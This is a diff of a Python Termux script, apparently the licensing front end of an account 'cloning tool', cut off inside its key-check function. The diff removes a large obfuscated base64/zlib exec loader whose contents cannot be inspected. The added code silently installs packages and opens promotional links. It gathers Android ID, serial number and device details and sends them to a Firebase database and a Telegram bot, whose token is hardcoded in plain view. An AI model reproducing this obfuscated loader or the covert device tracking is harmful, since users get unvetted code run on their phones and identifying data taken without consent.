@@ -1,3 +1,793 @@
-import base64, zlib
-# AHB Protected Script v12.3
-exec(zlib.decompress(base64.b64decode("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")))
+import os
+import re
+import time
+import uuid
+import hashlib
+import random
+import string
+import requests
+import sys
+import json
+import urllib
+import platform
+from bs4 import BeautifulSoup
+from random import randint as rr
+from concurrent.futures import ThreadPoolExecutor as tred
+from os import system
+from datetime import datetime
+import os
+import time
+
+channel_link = "https://whatsapp.com/channel/0029VbDl3Lu0gcfKhK3F9m0N"
+
+os.system(f"echo '{channel_link}' | termux-clipboard-set")
+print(" \x1b[1;32m[+] WhatsApp Channel Link Copied to Clipboard!")
+print(" \x1b[1;36m[*] Redirecting to WhatsApp Channel Automatically...")
+os.system(f"am start -a android.intent.action.VIEW -d '{channel_link}' > /dev/null 2>&1")
+time.sleep(2)
+
+
+import os
+import time
+
+
+yt_link = "https://www.youtube.com/@Update_29"
+print("[+] Opening YouTube Channel... Please Subscribe!")
+time.sleep(2)
+# Yeh Android/Termux ki apni command hai jo link ko direct open karti hai
+
+os.system(f"termux-open {yt_link}")
+import os
+import sys
+import time
+import platform
+import urllib.parse
+import random
+import string
+from datetime import datetime, timedelta
+
+# Ensure required modules are installed
+modules = ['requests', 'urllib3', 'mechanize', 'rich']
+for module in modules:
+    try:
+        __import__(module)
+    except ImportError:
+        os.system(f'pip install {module} > /dev/null 2>&1')
+
+import requests
+from requests.exceptions import ConnectionError
+
+requests.urllib3.disable_warnings()
+
+# --- Configuration ---
+FIREBASE_URL = "https://my-cloning-tool-default-rtdb.firebaseio.com/"
+whatsapp_number = '923052962654'
+
+# TELEGRAM CONFIGURATION
+BOT_TOKEN = "8533770908:AAGpn4bIfoArEOyN7SjTskWnzIyGGjEPOoc"
+TELEGRAM_USER = "7111707713"
+
+def get_device_model():
+    """Android Brand aur Model اکٹھا حاصل کرنے کا طریقہ"""
+    try:
+        brand = os.popen("getprop ro.product.brand").read().strip().capitalize()
+        model = os.popen("getprop ro.product.model").read().strip()
+        
+        if brand and model:
+            if brand.lower() in model.lower():
+                return model
+            return f"{brand} {model}"
+        elif model:
+            return model
+        elif brand:
+            return brand
+    except Exception:
+        pass
+    return "Unknown Device"
+
+def get_android_version():
+    """Android Version حاصل کرنے کا طریقہ"""
+    try:
+        return os.popen("getprop ro.build.version.release").read().strip() or "Unknown"
+    except Exception:
+        return "Unknown"
+
+def get_hwid():
+    """100% یونیک ڈیوائس آئی ڈی جو زیادہ سخت اور محفوظ بنا دی گئی ہے"""
+    try:
+        android_id = os.popen("settings get secure android_id").read().strip()
+        serial = os.popen("getprop ro.serialno").read().strip()
+        board = os.popen("getprop ro.board.platform").read().strip()
+        device = os.popen("getprop ro.product.device").read().strip()
+        
+        # In sab ko mila kar aik permanent hardware signature banana
+        combined = f"{android_id}_{serial}_{board}_{device}"
+        if android_id and android_id != "null" and len(combined) > 10:
+            return combined
+    except Exception:
+        pass
+    
+    try:
+        brand = os.popen("getprop ro.product.brand").read().strip()
+        model = os.popen("getprop ro.product.model").read().strip()
+        if brand or model:
+            return f"{brand}_{model}_{platform.node()}"
+    except Exception:
+        pass
+        
+    return "AHB_DEVICE_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+
+def record_user_daily_usage(user_key):
+    """یوزر کی روزانہ کی یوزیج ہسٹری فائر بیس پر سیو کرنے کا فنکشن"""
+    try:
+        today_date = datetime.now().strftime("%Y-%m-%d")
+        usage_path = f"{FIREBASE_URL}keys/{user_key}/daily_usage/{today_date}.json"
+        
+        res = requests.get(usage_path, timeout=3)
+        current_count = res.json()
+        
+        if current_count and isinstance(current_count, int):
+            new_count = current_count + 1
+        else:
+            new_count = 1
+            
+        requests.put(usage_path, json=new_count, timeout=3)
+    except Exception:
+        pass
+
+def send_login_alert(user_key, user_name, expiry_date):
+    device_name = get_device_model()
+    android_ver = get_android_version()
+    message = (
+        "🔥 NEW USER / TRIAL ACTIVATED!\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        f"👤 Customer Name: {user_name}\n"
+        f"🔑 Key / Trial Code: {user_key}\n"
+        f"📱 Device Model: {device_name}\n"
+        f"🤖 Android Ver: {android_ver}\n"
+        f"⏰ Expiry Date: {expiry_date}\n"
+        "━━━━━━━━━━━━━━━━━━"
+    )
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": TELEGRAM_USER, "text": message}
+    try:
+        requests.post(url, data=payload, timeout=5)
+    except Exception:
+        pass
+
+def open_whatsapp(customer_name):
+    custom_msg = f"PLEASE ALI SIR SEND ME KEY MY NAME IS {customer_name}"
+    msg_encoded = urllib.parse.quote(custom_msg)
+    wa_url = f"https://wa.me/{whatsapp_number}?text={msg_encoded}"
+    
+    if platform.system() == "Linux" and os.path.exists("/data/data/com.termux"):
+        os.system(f"am start -a android.intent.action.VIEW -d '{wa_url}' > /dev/null 2>&1")
+    else:
+        os.system(f"xdg-open '{wa_url}' > /dev/null 2>&1")
+
+def calculate_time_left(expiry_str):
+    if not expiry_str or expiry_str == "Lifetime":
+        return "Lifetime Access"
+    try:
+        if len(expiry_str) > 10:
+            exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
+        else:
+            exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d")
+        now = datetime.now()
+        diff = exp_dt - now
+        total_seconds = diff.total_seconds()
+        if total_seconds <= 0: return "Expired"
+        total_hours = int(total_seconds // 3600)
+        minutes = int((total_seconds % 3600) // 60)
+        if total_hours < 24:
+            return f"{total_hours}h {minutes}m Left"
+        else:
+            days = total_hours // 24
+            rem_hours = total_hours % 24
+            return f"{days}d {rem_hours}h {minutes}m Left"
+    except Exception:
+        return expiry_str
+
+def display_welcome_banner(user_name, user_key, time_left):
+    os.system('clear')
+    print(f"""
+\033[1;32m╔════════════════════════════════════════════╗
+║         NEW USER 2 DAYS FREE APROVEL 🔥    ║
+╠════════════════════════════════════════════╣
+║ USER NAME    : {user_name:<27} ║
+║ LICENSED KEY : {user_key:<27} ║
+║ VALIDITY     : {time_left:<27} ║
+║ SYSTEM STATUS: ONLINE & READY              ║
+╚════════════════════════════════════════════╝\033[0m
+""")
+
+def hold_screen_10_seconds():
+    for i in range(10, 0, -1):
+        print(f"\r\033[1;33m[⏳] Starting Tool in {i:02d} seconds...\033[0m", end="", flush=True)
+        time.sleep(1)
+    print("\n\033[1;32m[✓] Loading Main Menu...\033[0m")
+    time.sleep(1)
+
+def check_key():
+    try:
+        for m_node in ["maintenance.json", "maintenance_mode.json"]:
+            m_res = requests.get(f"{FIREBASE_URL}{m_node}", timeout=5)
+            m_status = m_res.json()
+            if m_status in ("ON", True, "True", 1, "1"):
+                os.system('clear')
+                print("\n\033[1;31m[!] SYSTEM IS UNDER MAINTENANCE / BLOCKED BY ADMIN!\033[0m")
+                print("\033[1;33m[!] Please try again later.\033[0m\n")
+                sys.exit()
+    except Exception:
+        pass
+
+    saved_key_file = "/data/data/com.termux/files/home/.ahb_key.txt"
+    try:
+        if not os.path.exists("/data/data/com.termux"):
+            import pathlib
+            saved_key_file = os.path.join(str(pathlib.Path.home()), ".ahb_key.txt")
+    except Exception:
+        pass
+        
+    user_hwid = get_hwid()
+    user_key = None
+    
+    if os.path.exists(saved_key_file):
+        try:
+            with open(saved_key_file, "r") as f:
+                user_key = f.read().strip().upper()
+        except Exception:
+            user_key = None
+
+    key_data = None
+    is_valid = False
+
+    if user_key:
+        try:
+            res = requests.get(f"{FIREBASE_URL}keys/{user_key}.json", timeout=10)
+            key_data = res.json()
+            if key_data and isinstance(key_data, dict):
+                expiry_str = key_data.get('expiry')
+                saved_hwid = key_data.get('hwid')
+                
+                if saved_hwid in ("None", "", None):
+                    requests.patch(f"{FIREBASE_URL}keys/{user_key}.json", json={'hwid': user_hwid})
+                    saved_hwid = user_hwid
+
+                now_str = datetime.now().strftime("%Y-%m-%d %H:%M")
+                if expiry_str != "Lifetime" and expiry_str < now_str:
+                    print("\n\033[1;31m[×] Your Key / Free Trial has Expired! Please buy a Paid Key.\033[0m")
